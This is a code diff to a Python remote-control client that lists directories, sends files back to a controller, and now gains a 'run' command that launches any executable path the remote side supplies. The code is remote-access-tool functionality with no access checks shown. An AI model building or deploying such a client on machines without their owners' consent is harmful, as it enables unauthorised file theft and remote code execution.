@@ -57,9 +57,16 @@ class Client:
     def directory(self, data: Dict[str, Any]) -> None:
         root_path = data["param"]["root"]
         file_list = []
-        for root, _, files in os.walk(root_path):
-            for file in files:
-                file_list.append(os.path.join(root, file))
+        try:
+            for entry in os.listdir(root_path):
+                entry_path = os.path.join(root_path, entry)
+                if os.path.isdir(entry_path):
+                    file_list.append(f"{entry_path}/")
+                elif os.path.isfile(entry_path):
+                    file_list.append(entry_path)
+        except Exception as e:
+            file_list.append(f"Error: {str(e)}")
+
         response = {
             "mode": "return",
             "controll_client_id": data["param"]["controll_client_id"],
@@ -75,7 +82,7 @@ class Client:
     def download(self, file_path: str, controll_client_id: str, output: str) -> None:
         with open(file_path, "rb") as f:
             while True:
-                chunk = f.read(1048576)
+                chunk = f.read(524288) # 0.5mb
                 if not chunk:
                     break
                 chunk_data = chunk.hex()
@@ -185,16 +192,20 @@ class Client:
                 return r
 
     def stop_remote_control(self, data):
-        print(data)
         remote_control_info = self.get_remote_control(data["remote_control_id"])
         remote_control_info["remote_control_threading"].stop()
         del remote_control_info
+
+    def run(self, data: Dict[str, Any]) -> None:
+        os.startfile(data["exe_path"])
 
     def handle_message(self, data: Dict[str, Any]) -> None:
         if data["mode"] == "init":
             self.id = data["id"]
         elif data["mode"] == "directory":
             self.directory(data)
+        elif data["mode"] == "run":
+            self.run(data)
         elif data["mode"] == "init_download":
             self.init_downlaod(data)
         elif data["mode"] == "init_remote_control":
@@ -204,7 +215,6 @@ class Client:
 
     def close(self) -> None:
         self.socket.close()
-        self.send_message({"mode": "close"})
         sys.exit()
 
 
